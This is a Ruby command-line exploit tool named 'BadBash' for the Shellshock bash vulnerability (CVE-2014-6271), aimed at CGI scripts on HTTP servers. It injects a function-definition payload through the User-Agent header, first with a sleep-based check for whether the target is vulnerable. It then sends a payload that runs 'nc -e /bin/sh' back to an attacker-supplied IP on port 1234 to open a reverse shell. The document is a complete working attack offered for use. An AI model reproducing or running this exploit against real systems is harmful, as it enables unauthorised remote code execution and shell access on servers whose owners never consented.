require 'net/http'
require 'optparse'



  ############################################################################
  ############################  Define color  ################################
  ############################################################################
  def colorize(text, color_code)
    "\e[#{color_code}m#{text}\e[0m"
  end

  def 
    red(text); colorize(text, 31); 
    end
  def 
    green(text); colorize(text, 32);
  end
  
  def 
    yellow(text); colorize(text, 33); 
  end

  def 
    pink(text); colorize(text, 35); 
  end



def check_vulnerable (target,path)
  puts green("[Info]     Checking if the target is vulnerable........")
  puts green("[Info]     This may take up to 10 seconds........")
  url='http://'+target 

  #User-Agent
  chkpayload= '() { :; }; /bin/sleep 9'

  begin 
    #res = Net::HTTP.get_response(URI.parse(url.to_s))
    start_time=Time.now
    
    http = Net::HTTP.new(URI(url).host)
    res = http.request_get(path,initheader = {'User-Agent' =>chkpayload})
    

    end_time=Time.now-start_time

    if (end_time >9 )
        bVulnerable= true
        puts yellow("[Info]     Target is vulnerable!!!")
    else
        puts yellow("[Info]     Target is not vulnerable.")
        bVulnerable= false

    end

    return bVulnerable
  rescue Exception => e
    puts red("[Error]   An error occurred during the vulnerability check: "+ e.to_s)
    exit 1
  end  


end





def exploit(target,dest)
  url='http://'+target
  path=target[target.index('/'), target.length-target.index('/')]
 
  if (check_vulnerable(target,path)==true)
  
    puts pink("[Info]     Please use NC to listen on port 1234 for reverse shell..........")
    puts pink("[Info]     Exploiting for a reverse shell to connect "+ dest+":1234 via netcat ..........")
    expayload="() { :; }; /bin/nc -e /bin/sh "+dest+" 1234"

  begin     
    http = Net::HTTP.new(URI(url).host)
    res = http.request_get(path,initheader = {'User-Agent' =>expayload})

    rescue Exception => e
      puts red("[Error]   An error occurred during the exploitation: "+ e.to_s)
      exit 1
    end 
  end

end



options = {}
optparse = OptionParser.new do|opts|
opts.banner =yellow("  
   ___           _   ___           _     
  / __\\ __ _  __| | / __\ __ _ ___| |__  
 /__\\/// _` |/ _` |/__\\/// _` / __| '_ \\ 
/ \\/  \\ (_| | (_| / \\/  \\ (_| \\__ \\ | | |      Basic Version - 0.1 by Andy Yang
\\_____/\\__,_|\\__,_\\_____/\\__,_|___/_| |_|      contactayang[AT]gmail[DOT]com
                                 ")
    opts.separator  "BadBash - CVE-2014-6271 RCE tool by Andy Yang"
    opts.separator "Basic version only checks for HTTP site"
    opts.separator "Basic version only provides netcat reverse shell on port 1234"
    opts.separator ""
    opts.separator  "EXAMPLE USAGE:"
    opts.separator  "     ./BBash.rb  -t 'www.target.com/cgi-folder/cgi.sh' -d \'127.0.0.1'"
    opts.separator  "     ./BBash.rb  -t '10.0.0.1/cgi-folder/cgi.sh' -d \'127.0.0.1'"
    # Define the options
    options[:target] = nil
    opts.on( '-t', '--Target CGI path', 'Full path of CGI page') do|target|
      options[:target] = target  

    end
     
    options[:dest] = nil
    opts.on( '-d', '--Destination IP', 'Your IP address that listen to an inbound connection' ) do |destIP|
       options[:dest] = destIP
     end      
    opts.on( '-h', '--help', 'Display help' ) do
    puts opts
    exit
    end
   end
   
   begin optparse.parse! ARGV  
   rescue OptionParser::InvalidOption => e
    puts e
    puts optparse
    exit 1
  end 
 



if (options[:target] == nil or options[:dest] == nil) 
  puts green("[Info]     Please supply target and/or an IP address. ")
  puts green("[Info]     For more infomation please refer to the followings usage:")
  puts optparse

else 
  t=options[:target]
  d=options[:dest]
  exploit(t,d)

end
